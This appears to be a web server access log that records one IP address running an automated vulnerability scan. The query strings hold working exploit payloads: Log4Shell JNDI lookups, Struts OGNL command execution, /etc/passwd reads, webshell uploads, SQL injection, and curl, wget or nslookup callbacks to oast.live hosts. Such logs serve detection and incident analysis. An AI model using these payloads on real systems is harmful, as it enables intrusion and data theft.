"/dr/authentication/oauth2/oauth2login","error=$%257Bjndi%253Aldap%253A%252F%252F$%257B%253A-452%257D$%257B%253A-272%257D.$%257BhostName%257D.uri.cl82amo80ssu2h3kcjs04k31ynei4wbbn.oast.live%257D","148.135.107.254","GET"
"/rest/domains/list","sortCol=fullyQualifiedName&sortDir=asc","148.135.107.254","GET"
"/mainfile.php","username=test&password=testpoc&_login=1&Logon=%2527%253Becho%2520md5(TestPoc)%253B%2527","148.135.107.254","GET"
"/login.php","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/","g=obj_app_upfile","148.135.107.254","POST"
"/zdm/cxf/login","-","148.135.107.254","POST"
"/api/user/reg","-","148.135.107.254","POST"
"/login.php","-","148.135.107.254","POST"
"/tool/log/c.php","strip_slashes=md5&host=2Y3PNsmtFrjifvGqSjeYuxJpskN","148.135.107.254","GET"
"/login.php","-","148.135.107.254","POST"
"/api/edr/sangforinter/v2/cssp/slog_client","token=eyJtZDUiOnRydWV9","148.135.107.254","POST"
"/rep/login","-","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/index.php","a=fetch&content=%253C%253Fphp+file_put_contents%2528%25222Y3POSvLIci5WOlwlXyY7O8rzbt.php%2522%252C%2522%253C%253Fphp+echo+phpinfo%2528%2529%253B%2522%2529%253B","148.135.107.254","GET"
"/seeyon/wpsAssistServlet","flag=save&realFileType=../../../../ApacheJetspeed/webapps/ROOT/s9gacY.jsp&fileId=2","148.135.107.254","POST"
"/api/v1/database/7","-","148.135.107.254","GET"
"/zms/admin/index.php","-","148.135.107.254","POST"
"/ddi/server/fileupload.php","uploadDir=upload&name=lmo32u.php","148.135.107.254","POST"
"/seeyon/main.do","method=changeLocale","148.135.107.254","POST"
"/actuator/env","-","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/general/appbuilder/web/portal/gateway/getdata","activeTab=%25E5%2527%2519,1%253D%253Eeval(base64_decode(%2522ZWNobyBtZDUoOTk5OTk5OTk5KTs=%2522)))%253B/*&id=19&module=Carouselimage","148.135.107.254","GET"
"/api/v1/database/7","-","148.135.107.254","GET"
"/api/group/list","-","148.135.107.254","GET"
"/","s=index/index/index","148.135.107.254","POST"
"/2Y3POSvLIci5WOlwlXyY7O8rzbt.php","-","148.135.107.254","GET"
"/mobile/api/api.ali.php","-","148.135.107.254","POST"
"/attachements/dniFbB.php","-","148.135.107.254","GET"
"/index.php","s=/index/index/name/$%257B@phpinfo()%257D","148.135.107.254","GET"
"/mac/gateway.php","-","148.135.107.254","POST"
"/suite-api/api/auth/token/acquire","-","148.135.107.254","POST"
"/","s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=phpinfo&vars%5B1%5D%5B%5D=1","148.135.107.254","GET"
"/index.php","s=captcha","148.135.107.254","POST"
"/module/ueditor/php/action_upload.php","action=uploadfile","148.135.107.254","POST"
"/view/IPV6/naborTable/static_convert.php","blocks%5B0%5D=%7C%7C%2520echo%2520%25272Y3POM3qxu2lPjI2JTFj4n6bYyt%2527%2520%253E%2520/var/www/html/config_application.txt%250a","148.135.107.254","GET"
"/hybridity/api/sessions","-","148.135.107.254","POST"
"/login","-","148.135.107.254","POST"
"/config_application.txt","-","148.135.107.254","GET"
"/api/v1/database/9","-","148.135.107.254","GET"
"/defaultroot/upload/fileUpload.controller","-","148.135.107.254","POST"
"/inc/package/work.php","id=../../../../../myoa/attach/approve_center/2311/%253E%253E%253E%253E%253E%253E%253E%253E%253E%253E%253E.fb6790f4","148.135.107.254","GET"
"/websso/SAML2/SSO/vsphere.local","SAMLRequest","148.135.107.254","GET"
"/api/v1/database/9","-","148.135.107.254","GET"
"/index.php","ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1","148.135.107.254","GET"
"/ispirit/interface/gateway.php","-","148.135.107.254","POST"
"/2Y3PNY1qVZAmQ7sRnsWxk1KX3qb.php","-","148.135.107.254","GET"
"/ui/login.action","-","148.135.107.254","POST"
"/defaultroot/officeserverservlet","-","148.135.107.254","GET"
"/2Y3POd1r9EK9gTS0FUuDGYRkjtM.php","-","148.135.107.254","GET"
"/client.do","-","148.135.107.254","POST"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","POST"
"/weaver/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/general/weibo/javascript/LazyUploadify/uploadify.php","-","148.135.107.254","GET"
"/general/weibo/javascript/uploadify/uploadify.php","-","148.135.107.254","GET"
"/wp-content/plugins/ait-csv-import-export/admin/upload-handler.php","-","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/weaver/com.weaver.formmodel.apps.ktree.servlet.KtreeUploadAction","action=image","148.135.107.254","POST"
"/eoffice10/server/public/iWebOffice2015/OfficeServer.php","-","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/inc/jquery/uploadify/uploadify.php","-","148.135.107.254","GET"
"/general/weibo/javascript/LazyUploadify/uploadify.php","-","148.135.107.254","POST"
"/general/weibo/javascript/uploadify/uploadify.php","-","148.135.107.254","POST"
"/wp-admin/admin-post.php","swp_debug=load_options&swp_url=%3Cpre%3Esystem(%27cat","148.135.107.254","GET"
"/my-account/","alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=","148.135.107.254","GET"
"/UploadFileData","action=upload_file&filename=../2Y3POFFGcdh12vWsjTFqSXeEKhg.jsp","148.135.107.254","POST"
"/weaver/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/eoffice10/server/public/iWebOffice2015/Document/jormg.php","-","148.135.107.254","GET"
"/wp-content/plugins/simple-file-list/ee-upload-engine.php","-","148.135.107.254","POST"
"/wp-content/uploads/2Y3PNq904ZKFZlwSE6xbYVgt6TR.php","-","148.135.107.254","GET"
"/wp-content/plugins/simple-file-list/ee-file-engine.php","-","148.135.107.254","POST"
"/attachment/personal/_temp.php","-","148.135.107.254","GET"
"/ServiceDispatcherServlet","-","148.135.107.254","POST"
"/wp-content/uploads/simple-file-list/fibgegh.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/servlet/FileReceiveServlet","-","148.135.107.254","POST"
"/uapim/upload/grouptemplet","groupid=85&fileType=jsp","148.135.107.254","POST"
"/","alg_wc_ev_verify_email=eyJpZCI6MSwiY29kZSI6MH0=","148.135.107.254","GET"
"/ajax/getemaildata.php","DontCheckLogin=1","148.135.107.254","POST"
"/api/v1/database/9","-","148.135.107.254","GET"
"/servlet/%7Ebaseapp/nc.message.bs.NCMessageServlet","-","148.135.107.254","POST"
"/api/v1/database/10","-","148.135.107.254","GET"
"/servlet/%7Ebaseapp/nc.message.bs.NCMessageServlet","-","148.135.107.254","POST"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/api/v1/database/10","-","148.135.107.254","GET"
"/uapjs/jsinvoke/","action=invoke","148.135.107.254","POST"
"/cgi-bin/kerbynet","Section=NoAuthREQ&Action=x509List&type=*%2522;/root/kerbynet.cgi/scripts/getkey%2520../../../etc/passwd;%2522","148.135.107.254","GET"
"/admin/user.php","-","148.135.107.254","GET"
"/servlet/%7Eic/bsh.servlet.BshServlet","-","148.135.107.254","POST"
"/servlet/codesettree","flag=c&status=1&codesetid=1&parentid=-1&categories=%7E31%7E27%7E20union%7E20all%7E20select%7E20%7E27hongjing%7E27%7E2c%7E40%7E40version%7E2d%7E2d","148.135.107.254","GET"
"/axis2-admin/login","-","148.135.107.254","POST"
"/level/16/exec/show/config/CR","-","148.135.107.254","GET"
"/user.action","-","148.135.107.254","POST"
"/axis2/axis2-admin/login","-","148.135.107.254","POST"
"/","search==%2500%7B.cookie%7CLaLrcW%7Cvalue%253dCVE-2014-6287.%7D","148.135.107.254","GET"
"/webadmin/clientlogin/","srid&action=showdeny&url","148.135.107.254","GET"
"/index.action","redirect:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/images/logo/logo-eoffice.php","-","148.135.107.254","GET"
"/users/sign_in","-","148.135.107.254","GET"
"/webadmin/auth/verification.php","-","148.135.107.254","POST"
"/wlsecurity.html","-","148.135.107.254","GET"
"/horde/admin/user.php","-","148.135.107.254","GET"
"/webadm/","q=moni_detail.do&action=gragh","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/invoker/JMXInvokerServlet/","-","148.135.107.254","POST"
"/","author=1","148.135.107.254","GET"
"/login.action","redirect:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/boardDataWW.php","-","148.135.107.254","POST"
"/cgi-bin/stats","-","148.135.107.254","GET"
"/fileserver/2Y3POcokwbkbOedSmEwjrukxGrN.txt","-","148.135.107.254","PUT"
"/cgi-bin/status","-","148.135.107.254","GET"
"/services/getFile.cmd","userfile=config.xml","148.135.107.254","GET"
"/","-","148.135.107.254","POST"
"/webadmin/script","command=%7C%2520nslookup%2520cl82amo80ssu2h3kcjs0gz8kjxjpw1e9u.oast.live","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/javax.faces.resource/dynamiccontent.properties.xhtml","-","148.135.107.254","POST"
"/rest/v1/AccountService/Accounts","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/_users/org.couchdb.user:poc","-","148.135.107.254","PUT"
"/fileserver/2Y3POcokwbkbOedSmEwjrukxGrN.txt","-","148.135.107.254","GET"
"/dumpmdm.cmd","-","148.135.107.254","GET"
"/yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/solr/admin/cores","wt=json","148.135.107.254","GET"
"/index.action","action:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/invoker/readonly","-","148.135.107.254","POST"
"/","name=%2525%257B%2528%2523dm%253D%2540ognl.OgnlContext%2540DEFAULT_MEMBER_ACCESS%2529.%2528%2523_memberAccess%253F%2528%2523_memberAccess%253D%2523dm%2529%253A%2528%2528%2523container%253D%2523context%255B%2527com.opensymphony.xwork2.ActionContext.container%2527%255D%2529.%2528%2523ognlUtil%253D%2523container.getInstance%2528%2540com.opensymphony.xwork2.ognl.OgnlUtil%2540class%2529%2529.%2528%2523ognlUtil.getExcludedPackageNames%2528%2529.clear%2528%2529%2529.%2528%2523ognlUtil.getExcludedClasses%2528%2529.clear%2528%2529%2529.%2528%2523context.setMemberAccess%2528%2523dm%2529%2529%2529%2529.%2528%2523cmd%253D%2527cat%2520/etc/passwd%2527%2529.%2528%2523iswin%253D%2528%2540java.lang.System%2540getProperty%2528%2527os.name%2527%2529.toLowerCase%2528%2529.contains%2528%2527win%2527%2529%2529%2529.%2528%2523cmds%253D%2528%2523iswin%253F%257B%2527cmd.exe%2527%252C%2527/c%2527%252C%2523cmd%257D%253A%257B%2527/bin/bash%2527%252C%2527-c%2527%252C%2523cmd%257D%2529%2529.%2528%2523p%253Dnew%2520java.lang.ProcessBuilder%2528%2523cmds%2529%2529.%2528%2523p.redirectErrorStream%2528true%2529%2529.%2528%2523process%253D%2523p.start%2528%2529%2529.%2528%2540org.apache.commons.io.IOUtils%2540toString%2528%2523process.getInputStream%2528%2529%2529%2529%257D","148.135.107.254","POST"
"/integration/saveGangster.action","-","148.135.107.254","POST"
"/login.action","action:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/index.action","redirect%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/CMSInstall/install.aspx","-","148.135.107.254","GET"
"/cgi-bin/login","LD_DEBUG=files","148.135.107.254","GET"
"/invoker/EJBInvokerServlet/","-","148.135.107.254","POST"
"/cgi-bin/status/status.cgi","-","148.135.107.254","GET"
"/cgi-bin/test","-","148.135.107.254","GET"
"/cobbler_api","-","148.135.107.254","POST"
"/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile","value=@GrabConfig(disableChecksums=true)%250a@GrabResolver(name=%2527test%2527,%2520root=%2527http://aaa%2527)%250a@Grab(group=%2527package%2527,%2520module=%2527vulntest%2527,%2520version=%25271%2527)%250aimport%2520Payload;","148.135.107.254","GET"
"/GponForm/diag_Form","images/","148.135.107.254","POST"
"/php/upload.php","-","148.135.107.254","POST"
"/","-","148.135.107.254","OPTIONS"
"/system/sharedir.php","-","148.135.107.254","POST"
"/zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/test.cgi","-","148.135.107.254","GET"
"/index.action","action%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/GponForm/diag_Form","images/","148.135.107.254","POST"
"/laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php","-","148.135.107.254","GET"
"/en/php/usb_sync.php","-","148.135.107.254","POST"
"/upload","-","148.135.107.254","POST"
"/manage/webshell/u","s=5&w=218&h=15&k=%2573%2565%2572%2576%2569%2563%2565%250a%2573%2573%2568%250a%2564%2569%2573%2561%2562%256c%2565%250a&l=62&_=5621298674064","148.135.107.254","GET"
"/cgi-bin/test-cgi","-","148.135.107.254","GET"
"/wp-admin/options-general.php","page=smartcode","148.135.107.254","POST"
"/debug.cgi","-","148.135.107.254","GET"
"/account","-","148.135.107.254","POST"
"/html/log","-","148.135.107.254","GET"
"/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm","-","148.135.107.254","POST"
"/web/google_analytics.php","-","148.135.107.254","POST"
"/ws_utc/resources/setting/options","-","148.135.107.254","POST"
"/soap.cgi","service=whatever-control;curl","148.135.107.254","POST"
"/manage/webshell/u","s=5&w=218&h=15&k=%250a&l=62&_=5621298674064","148.135.107.254","GET"
"/fuel/pages/select/","filter=%2527%252bpi(print(%2524a%253d%2527system%2527))%252b%2524a(%2527cat%2520/etc/passwd%2527)%252b%2527","148.135.107.254","GET"
"/hw-sys.htm","-","148.135.107.254","GET"
"/anchor/errors.log","-","148.135.107.254","GET"
"/user/register","element_parents=account/mail/%2523value&ajax_form=1&_wrapper_format=drupal_ajax","148.135.107.254","POST"
"/ws_utc/resources/setting/keystore","-","148.135.107.254","POST"
"/","id=nxbMek%2525%7B128*128%7D","148.135.107.254","GET"
"/index.action","redirectAction:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/login.action","redirectAction:$%7B%2523a%253d(new%2520java.lang.ProcessBuilder(new%2520java.lang.String%5B%5D%7B%27sh%27,%27-c%27,%27id%27%7D)).start(),%2523b%253d%2523a.getInputStream(),%2523c%253dnew%2520java.io.InputStreamReader(%2523b),%2523d%253dnew%2520java.io.BufferedReader(%2523c),%2523e%253dnew%2520char%5B50000%5D,%2523d.read(%2523e),%2523matt%253d%2523context.get(%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527),%2523matt.getWriter().println(%2523e),%2523matt.getWriter().flush(),%2523matt.getWriter().close()%7D","148.135.107.254","GET"
"/","-","148.135.107.254","GET"
"/checkValid","-","148.135.107.254","POST"
"/cgi-bin/kerbynet","Action=StartSessionSubmit&User=%27%250acat%2520/etc/passwd%250a%27&PW","148.135.107.254","GET"
"/install/lib/ajaxHandlers/ajaxServerSettingsChk.php","rootUname=%253b%2563%2561%2574%2520%252f%2565%2574%2563%252f%2570%2561%2573%2573%2577%2564%2520%2523","148.135.107.254","GET"
"/account","-","148.135.107.254","POST"
"/Uploads/2Y3PO2OgKFzJQrgNM9HxvSMa1u4.php7","-","148.135.107.254","GET"
"/crowd/plugins/servlet/exp","-","148.135.107.254","GET"
"/ui/api/v1/ui/auth/login","-","148.135.107.254","POST"
"/admin/auth/reset-password","-","148.135.107.254","POST"
"/password_change.cgi","-","148.135.107.254","POST"
"/.%250d./.%250d./.%250d./.%250d./bin/sh","-","148.135.107.254","POST"
"/pages/systemcall.php","command=cat%2520/etc/passwd","148.135.107.254","GET"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/getcfg.php","-","148.135.107.254","POST"
"/query","db=db&q=SHOW%2520DATABASES","148.135.107.254","GET"
"/Admin","-","148.135.107.254","GET"
"/index.action","redirectAction%253A%2524%257B%2523context%255B%2522xwork.MethodAccessor.denyMethodExecution%2522%255D%253Dfalse%252C%2523f%253D%2523%255FmemberAccess.getClass().getDeclaredField(%2522allowStaticMethodAccess%2522)%252C%2523f.setAccessible(true)%252C%2523f.set(%2523%255FmemberAccess%252Ctrue)%252C%2523a%253D%2540java.lang.Runtime%2540getRuntime().exec(%2522sh%2520-c%2520id%2522).getInputStream()%252C%2523b%253Dnew%2520java.io.InputStreamReader(%2523a)%252C%2523c%253Dnew%2520java.io.BufferedReader(%2523b)%252C%2523d%253Dnew%2520char%255B5000%255D%252C%2523c.read(%2523d)%252C%2523genxor%253D%2523context.get(%2522com.opensymphony.xwork2.dispatcher.HttpServletResponse%2522).getWriter()%252C%2523genxor.println(%2523d)%252C%2523genxor.flush()%252C%2523genxor.close()%257D","148.135.107.254","GET"
"/device.rsp","opt=user&cmd=list","148.135.107.254","GET"
"/crowd/admin/uploadplugin.action","-","148.135.107.254","POST"
"/CMSPages/Staging/SyncServer.asmx/ProcessSynchronizationTaskData","-","148.135.107.254","POST"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/","-","148.135.107.254","POST"
"/QMHtnJRQEc.txt","-","148.135.107.254","GET"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/SWNetPerfMon.db.i18n.ashx","l=tjkej&v=tjkej","148.135.107.254","GET"
"/free_time.cgi","-","148.135.107.254","GET"
"/ajax/render/widget_tabbedcontainer_tab_panel","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/adxmlrpc.php","-","148.135.107.254","POST"
"/apply_sec.cgi","-","148.135.107.254","POST"
"/plugins/3rdPartyServers/ox3rdPartyServers/max.class.php","0=id","148.135.107.254","GET"
"/test.txt","-","148.135.107.254","GET"
"/Autodiscover/Autodiscover.xml","-","148.135.107.254","POST"
"/objects/cwnwv.txt","-","148.135.107.254","GET"
"/objects/getImage.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=png","148.135.107.254","GET"
"/service/extdirect","-","148.135.107.254","POST"
"/cgi-bin/file_transfer.cgi","-","148.135.107.254","POST"
"/objects/getImageMP4.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=jpg","148.135.107.254","GET"
"/card_scan.php","No=30&ReaderNo=%2560cat%2520/etc/passwd%2520%253E%2520QMHtnJRQEc.txt%2560","148.135.107.254","GET"
"/web.config.i18n.ashx","l=tjkej&v=tjkej","148.135.107.254","GET"
"/ucmdb-api/connect","-","148.135.107.254","GET"
"/console/css/%25252e%25252e%25252fconsole.portal","-","148.135.107.254","POST"
"/api/timelion/run","-","148.135.107.254","POST"
"/webadmin/tools/unixlogin.php","login=admin&password=g%2527%252C%2527%2527%2529%253Bimport%2520os%253Bos.system%2528%25276563686f20224d6c6b7a55453534624778494e326c48546e6845596e46785256706d4f57314a53455a5322207c20626173653634202d64203e202f7573722f6c6f63616c2f6e6574737765657065722f77656261646d696e2f6f7574%2527.decode%2528%2527hex%2527%2529%2529%2523&timeout=5","148.135.107.254","GET"
"/_async/favicon.ico","-","148.135.107.254","GET"
"/cgi-bin/login.cgi","-","148.135.107.254","POST"
"/PDC/ajaxreq.php","PARAM=127.0.0.1+-c+0%253B+cat+%252Fetc%252Fpasswd&DIAGNOSIS=PING","148.135.107.254","POST"
"/","id=%2525%257B%2528%2523instancemanager%253D%2523application%255B%2522org.apache.tomcat.InstanceManager%2522%255D%2529.%2528%2523stack%253D%2523attr%255B%2522com.opensymphony.xwork2.util.ValueStack.ValueStack%2522%255D%2529.%2528%2523bean%253D%2523instancemanager.newInstance%2528%2522org.apache.commons.collections.BeanMap%2522%2529%2529.%2528%2523bean.setBean%2528%2523stack%2529%2529.%2528%2523context%253D%2523bean.get%2528%2522context%2522%2529%2529.%2528%2523bean.setBean%2528%2523context%2529%2529.%2528%2523macc%253D%2523bean.get%2528%2522memberAccess%2522%2529%2529.%2528%2523bean.setBean%2528%2523macc%2529%2529.%2528%2523emptyset%253D%2523instancemanager.newInstance%2528%2522java.util.HashSet%2522%2529%2529.%2528%2523bean.put%2528%2522excludedClasses%2522%252C%2523emptyset%2529%2529.%2528%2523bean.put%2528%2522excludedPackageNames%2522%252C%2523emptyset%2529%2529.%2528%2523arglist%253D%2523instancemanager.newInstance%2528%2522java.util.ArrayList%2522%2529%2529.%2528%2523arglist.add%2528%2522cat+%252Fetc%252Fpasswd%2522%2529%2529.%2528%2523execute%253D%2523instancemanager.newInstance%2528%2522freemarker.template.utility.Execute%2522%2529%2529.%2528%2523execute.exec%2528%2523arglist%2529%2529%257D","148.135.107.254","GET"
"/login","-","148.135.107.254","POST"
"/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php","-","148.135.107.254","POST"
"/wls-wsat/CoordinatorPortType","-","148.135.107.254","POST"
"/objects/getSpiritsFromVideo.php","base64Url=YGlkID4gY3dud3YudHh0YA===&format=jpg","148.135.107.254","GET"
"/_async/AsyncResponseService","-","148.135.107.254","POST"
"/artifactory/ui/auth/login","_spring_security_remember_me=false","148.135.107.254","POST"
"/","-","148.135.107.254","GET"
"/api/experimental/latest_runs","-","148.135.107.254","GET"
"/lib/crud/userprocess.php","-","148.135.107.254","POST"
"/mailingupgrade.php","-","148.135.107.254","POST"
"/wp-admin/admin-ajax.php","-","148.135.107.254","POST"
"/lib/crud/userprocess.php","-","148.135.107.254","POST"
"/tos/index.php","explorer/pathList&path=%2560curl+http%253a//cl82amo80ssu2h3kcjs09mxyojox1y51j.oast.live+-H+%27User-Agent%253a+YtsR7T%27%2560","148.135.107.254","GET"
"/wp-content/uploads/wp_dndcf7_uploads/wpcf7-files/2Y3POWuPeG4NEyV5sD5gRAERKvv.txt","-","148.135.107.254","GET"
"/cgi-bin/system_mgr.cgi","-","148.135.107.254","POST"
"/","pum_action=tools_page_tab_system_info","148.135.107.254","GET"
"/servlet/UploadServlet","-","148.135.107.254","POST"
"/login.php","-","148.135.107.254","GET"
"/tests/support/stores/test_grid_filter.php","query=echo%2520md5%2528%2522CVE-2020-19625%2522%2529%253B","148.135.107.254","GET"
"/","p=1","148.135.107.254","GET"
"/cgi-bin/system_mgr.cgi","C1=ON&cmd=cgi_ntp_time&f_ntp_server=%60curl","148.135.107.254","POST"
"/incom/modules/uploader/showcase/script.php","-","148.135.107.254","POST"
"/q","start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o&ylabel&xrange=10:10&yrange=%5B33:system(%2527wget%2520http://cl82amo80ssu2h3kcjs0zwqp8j534wz48.oast.live%2527)%5D&wxh=1516x644&style=linespoint&baba=lala&grid=t&json","148.135.107.254","GET"
"/actions/authenticate.php","-","148.135.107.254","POST"
"/console/images/%25252e%25252e%25252fconsole.portal","_nfpb=true&_pageLabel&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(%27http://cl82amo80ssu2h3kcjs0nbuhsp76idjw9.oast.live%27)","148.135.107.254","GET"
"/index.php","r=test/sss&data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNToiRmFrZXJcR2VuZXJhdG9yIjoxOntzOjEzOiIAKgBmb3JtYXR0ZXJzIjthOjE6e3M6NToiY2xvc2UiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6Njoic3lzdGVtIjtzOjI6ImlkIjtzOjY6ImxzIC1hbCI7fWk6MTtzOjM6InJ1biI7fX19fQ==","148.135.107.254","GET"
"/checkValid","-","148.135.107.254","POST"
"/include/exportUser.php","type=3&cla=application&func=_exec&opt=(cat%2520/etc/passwd)%253Eaxpw.txt","148.135.107.254","GET"
"/ajax/render/widget_tabbedcontainer_tab_panel","-","148.135.107.254","POST"
"/public/index.php/home/index/bind_follow/","publicid=1&is_ajax=1&uid%5B0%5D=exp&uid%5B1%5D=)%2520and%2520updatexml(1,concat(0x7e,md5(%27999999%27),0x7e),1)--++","148.135.107.254","POST"
"/include/axpw.txt","-","148.135.107.254","GET"
"/api/config","-","148.135.107.254","GET"
"/manage/fileDownloader","sec=1","148.135.107.254","GET"
"/include/makecvs.php","Event=%2560curl+http%253a//cl82amo80ssu2h3kcjs0gc4fh43ed7cg9.oast.live+-H+%27User-Agent%253a+YtsR7T%27%2560","148.135.107.254","GET"
"/mifs/.;/services/LogService","-","148.135.107.254","POST"
"/","username=zyfwp&password=PrOw!aN_fXp","148.135.107.254","GET"
"/nette.micro/","callback=shell_exec&cmd=cat%2520/etc/passwd&what=-1","148.135.107.254","GET"
"/run","-","148.135.107.254","POST"
"/var","-","148.135.107.254","POST"
"/webadmin/out","-","148.135.107.254","GET"
"/login.htm","-","148.135.107.254","POST"
"/goform/setSysAdm","-","148.135.107.254","POST"
"/assets/data/usrimg/2y3pofzofrtkcdo63japdmcs2nr.php","-","148.135.107.254","GET"
